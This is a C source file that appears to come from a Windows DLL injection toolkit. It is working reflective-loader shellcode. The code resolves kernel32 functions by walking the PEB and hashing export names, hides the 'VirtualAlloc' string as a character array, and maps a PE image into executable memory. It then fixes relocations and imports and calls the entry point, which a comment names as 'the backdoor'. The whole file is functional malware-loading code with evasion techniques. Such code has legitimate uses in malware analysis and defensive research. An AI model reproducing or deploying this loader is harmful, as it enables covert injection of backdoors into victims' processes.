#include "stdafx.h"
#include <intrin.h>  
  
#pragma intrinsic(__movsb) 

typedef PVOID (WINAPI * func_VirtualAlloc)(
    PVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect
);
//--------------------------------------------------------------------------------------
ULONG NTAPI dll_inject_shellcode(PVOID Param)
{
    dll_inject_LoadLibraryA f_LoadLibraryA = NULL;
    dll_inject_GetProcAddress f_GetProcAddress = NULL;

    // get kernel32.dll base address
    PVOID KernelBase = dll_inject_GetModuleAddressByHash(DLL_INJECT_HASH_KERNEL32);
    if (KernelBase)
    {
        f_LoadLibraryA = (dll_inject_LoadLibraryA)
            dll_inject_GetProcAddressByHash(KernelBase, DLL_INJECT_HASH_LOAD_LIBRARY_A);

        f_GetProcAddress = (dll_inject_GetProcAddress)
            dll_inject_GetProcAddressByHash(KernelBase, DLL_INJECT_HASH_GET_PROC_ADDRESS);
    }

    if (f_LoadLibraryA == NULL || f_GetProcAddress == NULL)
    {
        // unable to import required functions
        return -1;
    }    

    char szFunc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };

    // get kernel32!VirtualAlloc address
    func_VirtualAlloc f_VirtualAlloc = (func_VirtualAlloc)f_GetProcAddress(KernelBase, szFunc);
    if (f_VirtualAlloc == NULL)
    {
        return -1;
    }

    if (Param == NULL || *(PUSHORT)Param != IMAGE_DOS_SIGNATURE)
    {
        // no image specified or bad image
        return -1;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(Param, ((PIMAGE_DOS_HEADER)Param)->e_lfanew); 

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    PUCHAR Image = (PUCHAR)f_VirtualAlloc(NULL, pHeaders->OptionalHeader.SizeOfImage, 
                                          MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (Image == NULL)
    {
        return -1;
    }

    // copy headers
    __movsb(Image, (PUCHAR)Param, pHeaders->OptionalHeader.SizeOfHeaders);

    // copy sections        
    for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
    {
        __movsb(
            RVATOVA(Image, pSection->VirtualAddress),
            RVATOVA(Param, pSection->PointerToRawData),
            min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
        );

        pSection += 1;
    }

    if (!dll_inject_ProcessRelocs(Image, Image))
    {
        return -1;
    }

    if (!dll_inject_ProcessImports(Image))
    {
        return -1;
    }

    if (pHeaders->OptionalHeader.AddressOfEntryPoint)
    {
        typedef BOOL(WINAPI * DLL_MAIN)(PVOID hinstDLL, DWORD fdwReason, ULONG_PTR lpReserved);

        DLL_MAIN Main = (DLL_MAIN)RVATOVA(Image, pHeaders->OptionalHeader.AddressOfEntryPoint);

        /* 
            Call dll entry point, lpReserved = TRUE tells to the backdoor
            that it must execute its main code within the same thread.
        */
        Main(Image, DLL_PROCESS_ATTACH, TRUE);
    }

    return 0;
}
//--------------------------------------------------------------------------------------
ULONG NTAPI dll_inject_CalcHash(char *lpszString)
{
    ULONG Hash = 0;
    char *lpszChar = lpszString;

    while (*lpszChar) 
    {
        Hash = ((Hash << 7) & (ULONG)-1) | (Hash >> (32 - 7));
        Hash = Hash ^ *lpszChar;

        lpszChar += 1;
    }

    return Hash;
}
//--------------------------------------------------------------------------------------
PVOID NTAPI dll_inject_GetModuleAddressByHash(ULONG ModuleHash)
{
    PUCHAR Peb = NULL;

#ifdef _X86_

    Peb = (PUCHAR)__readfsdword(0x30);

#else _AMD64_

    PUCHAR Teb = (PUCHAR)__readgsqword(0x30);
    if (Teb)
    {
        Peb = *(PUCHAR *)(Teb + 0x60);
    }    

#endif    

    if (Peb == NULL)
    {
        // process is not initialized properly
        return NULL;
    }

    // obtain address of first entry in loader's table
    PPEB_LDR_DATA LdrData = *(PPEB_LDR_DATA *)(Peb + DLL_INJECT_PEB_LDR_TABLE_OFFSET);
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    // parse loader table entries
    while (Entry != Head)
    {
        char szBaseDllName[MAX_PATH];        
        PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD(Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);                
        ULONG NameLength = LdrData->BaseDllName.Length / sizeof(WCHAR);

        for (USHORT i = 0; i < NameLength; i++)
        {
            // copy module name into ANSI string
            char Chr = (char)LdrData->BaseDllName.Buffer[i];

            if ((Chr >= 'A') && (Chr <= 'Z')) 
            {
                // convert characetr to the low case
                Chr = Chr + ('a' - 'A');
            }

            szBaseDllName[i] = Chr;
        }

        szBaseDllName[NameLength] = '\0';

        // check the name hash
        if (dll_inject_CalcHash(szBaseDllName) == ModuleHash) 
        {
            return LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
PVOID NTAPI dll_inject_GetProcAddressByHash(PVOID Image, ULONG ProcHash)
{
    if (Image == NULL)
    {
        // something goes wrong
        return NULL;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);    

    if (pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
    {
        ULONG ExportSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)RVATOVA(Image,
            pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); 

        if (pExport->AddressOfFunctions == 0 ||
            pExport->AddressOfNameOrdinals == 0 ||
            pExport->AddressOfNames == 0)
        {
            // no exports by name
            return NULL;
        }      

        // parse module exports
        PULONG AddressOfFunctions = (PULONG)RVATOVA(Image, pExport->AddressOfFunctions);
        PSHORT AddrOfOrdinals = (PSHORT)RVATOVA(Image, pExport->AddressOfNameOrdinals);
        PULONG AddressOfNames = (PULONG)RVATOVA(Image, pExport->AddressOfNames);

        for (ULONG i = 0; i < pExport->NumberOfNames; i++)
        {
            // calculate and compare hash of function
            if (dll_inject_CalcHash((char *)RVATOVA(Image, AddressOfNames[i])) == ProcHash)
            {
                // return function VA
                PUCHAR Ret = (PUCHAR)RVATOVA(Image, AddressOfFunctions[AddrOfOrdinals[i]]);

                if (ExportSize > (ULONG_PTR)Ret - (ULONG_PTR)pExport)
                {
                    // this is forwarded export, currently we don't processing them
                    // ...

                    return NULL;
                }

                return Ret;
            }
        }
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
BOOLEAN NTAPI dll_inject_ProcessRelocs(PVOID Image, PVOID NewBase)
{
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    ULONG_PTR OldBase = pHeaders->OptionalHeader.ImageBase;

    if (pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
    {
        PIMAGE_BASE_RELOCATION pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(
            Image,
            pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
        );

        ULONG Size = 0;
        ULONG RelocationSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

        while (RelocationSize > Size && pRelocation->SizeOfBlock)
        {
            ULONG Number = (pRelocation->SizeOfBlock - 8) / 2;
            PUSHORT Rel = (PUSHORT)((PUCHAR)pRelocation + 8);

            for (ULONG i = 0; i < Number; i++)
            {
                if (Rel[i] > 0)
                {
                    USHORT Type = (Rel[i] & 0xF000) >> 12;

                    // check for supporting type
                    if (Type != IMAGE_REL_BASED_HIGHLOW &&
                        Type != IMAGE_REL_BASED_DIR64 &&
                        Type != IMAGE_REL_BASED_ABSOLUTE)
                    {
                        return FALSE;
                    }

                    // fix base
                    if (Type == IMAGE_REL_BASED_HIGHLOW  || Type == IMAGE_REL_BASED_DIR64)
                    {
                        *(PULONG_PTR)RVATOVA(Image, pRelocation->VirtualAddress +(Rel[i] & 0x0FFF)) += 
                            (ULONG_PTR)NewBase - OldBase;
                    }
                }
            }

            pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(pRelocation, pRelocation->SizeOfBlock);
            Size += pRelocation->SizeOfBlock;
        }

        return TRUE;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOLEAN NTAPI dll_inject_ProcessImports(PVOID Image)
{
    dll_inject_LoadLibraryA f_LoadLibraryA = NULL;
    dll_inject_GetProcAddress f_GetProcAddress = NULL;

    // get kernel32.dll base address
    PVOID KernelBase = dll_inject_GetModuleAddressByHash(DLL_INJECT_HASH_KERNEL32);
    if (KernelBase)
    {
        f_LoadLibraryA = (dll_inject_LoadLibraryA)
            dll_inject_GetProcAddressByHash(KernelBase, DLL_INJECT_HASH_LOAD_LIBRARY_A);

        f_GetProcAddress = (dll_inject_GetProcAddress)
            dll_inject_GetProcAddressByHash(KernelBase, DLL_INJECT_HASH_GET_PROC_ADDRESS);
    }

    if (f_LoadLibraryA == NULL || f_GetProcAddress == NULL)
    {
        // unable to import required functions
        return FALSE;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
        RVATOVA(Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    if (pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
    {
        ULONG ImportSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)RVATOVA(Image,
            pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);        

        while (pImport->Name != 0)
        {                
            char *lpszLibName = (char *)RVATOVA(Image, pImport->Name);

            // load import library
            PVOID LibAddr = f_LoadLibraryA(lpszLibName);
            if (LibAddr == NULL)
            {
                return FALSE;
            }            

            // process thunks data
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)RVATOVA(Image, pImport->FirstThunk);
            while (pThunk->u1.Ordinal != 0)
            {
#ifdef _X86_
                if (pThunk->u1.Ordinal & 0xf0000000)
#else _AMD64_
                if (pThunk->u1.Ordinal & 0xf000000000000000)
#endif
                {
                    // lookup function address by ordinal
                    PVOID FuncAddr = f_GetProcAddress(LibAddr, (char *)(pThunk->u1.Ordinal & 0xffff));
                    if (FuncAddr == NULL)
                    {
                        return FALSE;
                    }                    

                    *(PVOID *)pThunk = FuncAddr;
                }
                else
                {                    
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)RVATOVA(Image, pThunk->u1.AddressOfData);
                    char *lpszFuncName = (char *)&pName->Name;

                    // lookup function address by name
                    PVOID FuncAddr = f_GetProcAddress(LibAddr, lpszFuncName);
                    if (FuncAddr == NULL)
                    {
                        return FALSE;
                    }                   

                    *(PVOID *)pThunk = FuncAddr;
                }

                pThunk += 1;
            }

            pImport += 1;
        }
    }

    return TRUE;
}

void NTAPI dll_inject_shellcode_end(void) { }
//--------------------------------------------------------------------------------------
// EoF
